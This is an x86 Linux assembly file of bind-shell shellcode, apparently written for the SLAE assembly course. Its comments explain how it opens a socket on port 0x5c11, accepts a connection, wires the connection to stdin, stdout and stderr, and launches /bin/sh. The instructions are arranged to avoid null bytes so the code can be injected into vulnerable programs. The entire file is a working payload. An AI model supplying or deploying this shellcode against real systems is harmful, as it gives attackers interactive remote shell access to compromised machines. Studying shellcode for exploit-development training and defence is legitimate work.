; Linux/x86 bindshell shellcode
; By Daniel Roberson -- @dmfroberson -- daniel@planethacker.net
; 
; For the SecurityTube Linux Assembly Expert course.
; SLAE-877

BITS 32

;
; Port number. In network byte order. Calculate with Python:
; python -c "import socket; print '0x%04x' % socket.htons(1280)"
;
PORT equ 0x5c11                ; port to bind to

xor eax, eax                   ; zero out eax register
xor ebx, ebx                   ; zero out ebx register
xor edx, edx                   ; zero out ebx register

add eax, 102                   ; socketcall() -- changed to add to get rid of null byte
inc ebx                        ; socket()      -- changed to inc to get rid of null byte
push edx                       ; protocol. 0 = IP
push 1                         ; SOCK_STREAM
push 2                         ; AF_INET
mov ecx, esp                   ; array of arguments for socket()
int 0x80                       ; call socket()

mov esi, eax                   ; move fd for socket into esi

xor eax, eax                   ; zero out eax
add eax, 102                   ; socketcall() -- got rid of the null byte
inc ebx                        ; bind()
push edx                       ; INADDR_ANY

mov cx, PORT                   ; use cx rather than ecx to remove two null bytes
push cx

push word 2                    ; AF_INET
mov ecx, esp                   ; bind() args
push 16                        ; size
push ecx                       ; fd
push esi                       ; socket fd
mov ecx, esp                   ; call bind()
int 0x80

xor eax, eax                   ; zero out eax
add eax, 102                   ; socketcall() -- changed to add to remove null byte
xor ebx, ebx                   ; zero out ebx
add ebx, 4                     ; listen()     -- changed to add to remove null byte
push edx                       ; backlog = 0
push esi                       ; socket fd
mov ecx, esp                   ; listen arguments
int 0x80                       ; call listen()

xor eax, eax                   ; zero out eax 
add eax, 102                   ; socketcall() -- changed to add to remove null byte
xor ebx, ebx                   ; zero out ebx
add ebx, 5                     ; accept()  -- changed to add to remove null byte
push edx                       ; zero addrlen
push edx                       ; null sockaddr
push esi                       ; sockfd
mov ecx, esp                   ; accept() arguments
int 0x80                       ; call socketcall()
 
xchg ebx, eax                  ; store socket fd for dup2()
 
xor ecx, ecx                   ; zero out ecx
mov cl, 2                      ; initialize counter
loop:
    xor eax, eax               ; zero out eax
    add eax, 63                ; dup2()
    int 0x80
    dec ecx                    ; decrease counter
    jns loop                   ;
 
xchg eax, edx                  ; copy null byte into eax
push eax                       ; push null byte
push 0x68732f2f                ; //sh
push 0x6e69622f                ; /bin
mov ebx, esp                   ; 
push eax                       ; null
push ebx                       ; address of /bin/sh 
mov ecx, esp                   ;
push eax                       ; null
mov edx, esp                   ; envp
mov al, 11                     ; execve()
int 0x80                       ; call execve()

